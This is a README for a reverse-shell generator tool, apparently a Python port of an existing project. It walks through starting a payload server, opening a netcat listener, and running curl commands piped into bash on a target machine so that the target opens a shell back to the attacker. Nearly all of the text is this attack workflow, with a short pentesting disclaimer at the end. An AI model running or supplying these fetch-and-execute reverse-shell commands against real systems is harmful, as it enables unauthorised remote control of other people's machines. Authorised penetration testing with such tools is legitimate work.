# shell-hunter

> This is a Python version of https://github.com/lukechilds/reverse-shell with additional functionality (if you want to call it that).   
> All credit goes to lukechilds
> All credit goes to lukechilds & wrighterase/payl0ad/person/thing

Easy to remember reverse shell that should work on most Unix-like systems.

Detects available software on the target and runs an appropriate payload.

## Usage

### 1. Start the generator

On your attacking machine, start the generator.  It will auto populate interfaces that have IP addresses and the `curl` command associated with it if no arguments are provided.  Not all interfaces in this output will be relevant.

You can specify the http server listening port as well, otherwise it defaults to 8000.

```generator
usage: shell-hunter.py [-h] [-s SERVER] [-l LISTENER] [-i IPADDRESS] [-I INTERFACE]

Automatic payload generation

optional arguments:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        Python http server listener
  -l LISTENER, --listener LISTENER
                        nc listener
  -i IPADDRESS, --ipaddress IPADDRESS
                        IP address
  -I INTERFACE, --interface INTERFACE
                        Interface name
```
This is the default output if no flags are provided.  This is only included as a template and the output will change depending on if you include an IP address.  Changing the IP address and/or port is still possible without restarting, but the `curl` template will not refresh.

```output
Shell generator started: 8000
curl -s http://127.0.0.1:8000/lo|bash
curl -s http://10.0.0.85:8000/eth0|bash
curl -s http://10.0.0.85:8000/tun0|bash
curl -s http://172.17.0.1:8000/docker0|bash
```
### 2. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -lvnp 1337
```
### 2. Execute reverse shell on target

On the target machine,

```shell examples
curl -s http://attacker:8000/tun0|bash
curl -s http://attacker:8000/IP:PORT|bash
curl -s http://attacker:8000/IP|bash
```

Go back to your machine, you should now have a shell prompt.

### 3.  Disclaimer

This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.  Obligatory "I'm not responsible for your actions and/or misuse of this code"
